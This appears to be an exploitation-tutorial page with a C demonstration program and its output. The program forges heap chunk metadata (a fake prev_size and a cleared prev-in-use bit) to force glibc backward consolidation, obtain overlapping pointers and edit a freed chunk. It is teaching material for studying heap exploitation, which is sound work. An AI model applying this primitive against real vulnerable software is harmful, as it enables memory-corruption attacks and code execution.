# edit free chunk uaf explanation

This module essentially explains what heap consolidation achieved via a buffer overflow is. It can be used to edit freed chunks, and heap metadata among other things. This can be very useful for other attacks. Checkout the well documented source code or binary to see the explanation.

The code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    puts("The goal of this is to show how we can edit a freed chunk using a heap overflow bug to cause consolidation.");
    puts("Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.");
    puts("However a bug to edit the heap metadata is often just one piece of the exploitation process.\n");

    printf("We will start off by allocating four separate chunks of memory. The first three will be used for the heap consolidation.\n");
    printf("The last one will be used to essentially separate this from the heap wilderness, and we won't do anything with it.\n\n");

    unsigned long *ptr0, *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;

    ptr0 = malloc(0x500);
    ptr1 = malloc(0x70);
    ptr2 = malloc(0x500);
    ptr3 = malloc(0x30);

    printf("Chunk 0: %p\t Size: 0x500\n", ptr0);
    printf("Chunk 1: %p\t Size: 0x70\n", ptr1);
    printf("Chunk 2: %p\t Size: 0x500\n", ptr2);
    printf("Chunk 3: %p\t Size: 0x30\n\n", ptr3);

    printf("Now the reason why the first and second chunks are 0x500 in sizes, is because they will be the ones we are freeing. In the most recent libc versions (2.26 & 2.27), there is a tcache mechanism.\n");
    printf("If these chunks were much smaller, they would be stored in the tcaching mechanism and this wouldn't work. So I made them large so they wouldn't end up in the tcache.\n\n");
    
    printf("Start off by freeing ptr0, and clearing the pointer (which is often done when heap chunks get freed to avoid a use after free).\n\n");

    free(ptr0);
    ptr0 = 0;

    printf("Chunk 0: %p\n\n", ptr0);

    printf("Now is where the heap overflow bug comes into play. We will overflow the heap metadata of ptr2. We can see that the size of ptr2 is 0x511.\n\n");

    printf("Size of Chunk 2 @ %p\t Metadata Size: 0x%lx\n\n", ptr2, ptr2[-1]);

    printf("0x500 bytes for the data, 0x10 bytes for the metadata, and 0x1 byte to designate that the previous chunk is in use. Our overflow will overwrite this, and the previous size value.\n");
    printf("We will overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed (which it hasn't).\n");
    printf("So following that, we will place a fake previous size which is the previous QWORD behind the size. We will put it as 0x590, so it thinks that the previous chunk goes all the way back to where Chunk 0 is.\n");
    printf("Then when we free Chunk 2, it will consolidate the heap past chunk 1 and up to chunk 0. Then we can start allocating memory from where Chunk 0, and get an overlapping pointer to where Chunk 1 is, since it thinks it has been freed.\n");
    printf("Let's do the overwrite.\n\n");

    ptr1[14] = 0x590;
    ptr1[15] = 0x510;

    printf("Chunk 2 @ %p\nPrevious Size: 0x%lx\nSize: 0x%lx\n\n", ptr2, ptr2[-2], ptr2[-1]);

    printf("Now we free chunk 2 to cause consolidation.\n\n");

    free(ptr2);
    ptr2 = 0;

    printf("Now we can allocate a 0x500 chunk and an 0x70 chunk, and we wil get a pointer to where chunk 1 was.\n\n");
    ptr4 = malloc(0x500);
    ptr5 = malloc(0x70);    

    printf("Chunk 4: %p\t Size: 0x500\n", ptr4);
    printf("Chunk 5: %p\t Size: 0x30\n\n", ptr5);

    printf("With that we can just free Chunk 1 (which is the same as Chunk 5), and we will be able to edit a freed heap chunk.\n\n");

    free(ptr1);
    ptr1 = 0;

    char *data = "15935728\x00";
    memcpy(ptr5, data, 0x9);

    printf("Chunk 5 @ %p\t Contains: %s\n\n", ptr5, (char *)ptr5);

    printf("Just like that we use a heap overflow to cause a heap consolidation past an allocated chunk, get overlapping pointers, and edit a free chunk!\n");
}
```

The code running:
```
$   ./heap_consolidation_explanation 
The goal of this is to show how we can edit a freed chunk using a heap overflow bug to cause consolidation.
Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.
However a bug to edit the heap metadata is often just one piece of the exploitation process.

We will start off by allocating four separate chunks of memory. The first three will be used for the heap consolidation.
The last one will be used to essentially separate this from the heap wilderness, and we won't do anything with it.

Chunk 0: 0x55b4366fd670  Size: 0x500
Chunk 1: 0x55b4366fdb80  Size: 0x70
Chunk 2: 0x55b4366fdc00  Size: 0x500
Chunk 3: 0x55b4366fe110  Size: 0x30

Now the reason why the first and second chunks are 0x500 in sizes, is because they will be the ones we are freeing. In the most recent libc versions (2.26 & 2.27), there is a tcache mechanism.
If these chunks were much smaller, they would be stored in the tcaching mechanism and this wouldn't work. So I made them large so they wouldn't end up in the tcache.

Start off by freeing ptr0, and clearing the pointer (which is often done when heap chunks get freed to avoid a use after free).

Chunk 0: (nil)

Now is where the heap overflow bug comes into play. We will overflow the heap metadata of ptr2. We can see that the size of ptr2 is 0x511.

Size of Chunk 2 @ 0x55b4366fdc00     Metadata Size: 0x511

0x500 bytes for the data, 0x10 bytes for the metadata, and 0x1 byte to designate that the previous chunk is in use. Our overflow will overwrite this, and the previous size value.
We will overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed (which it hasn't).
So following that, we will place a fake previous size which is the previous QWORD behind the size. We will put it as 0x590, so it thinks that the previous chunk goes all the way back to where Chunk 0 is.
Then when we free Chunk 2, it will consolidate the heap past chunk 1 and up to chunk 0. Then we can start allocating memory from where Chunk 0, and get an overlapping pointer to where Chunk 1 is, since it thinks it has been freed.
Let's do the overwrite.

Chunk 2 @ 0x55b4366fdc00
Previous Size: 0x590
Size: 0x510

Now we free chunk 2 to cause consolidation.

Now we can allocate a 0x500 chunk and an 0x70 chunk, and we wil get a pointer to where chunk 1 was.

Chunk 4: 0x55b4366fd670  Size: 0x500
Chunk 5: 0x55b4366fdb80  Size: 0x30

With that we can just free Chunk 1 (which is the same as Chunk 5), and we will be able to edit a freed heap chunk.

Chunk 5 @ 0x55b4366fdb80     Contains: 15935728

Just like that we use a heap overflow to cause a heap consolidation past an allocated chunk, get overlapping pointers, and edit a free chunk!
```